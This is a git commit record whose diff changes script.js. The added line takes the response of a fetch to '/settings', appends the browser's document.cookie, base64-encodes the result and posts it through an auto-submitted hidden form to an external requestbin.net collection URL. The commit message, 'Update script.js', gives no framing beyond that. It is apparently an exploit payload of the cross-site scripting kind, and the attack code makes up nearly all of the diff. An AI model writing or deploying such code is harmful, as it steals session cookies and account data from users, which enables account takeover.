70387e00e9773d17e2d811f9fe12fb5cf08eae70
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 20:25:56 +0530

    Update script.js

--- script.js
+++ script.js
@@ -8,5 +8,5 @@ fetch("/settings", {
      headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
     }
-});
+}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(encodeURI(back+document.cookie));f.appendChild(i);document.body.appendChild(f);f.submit();})})
    })
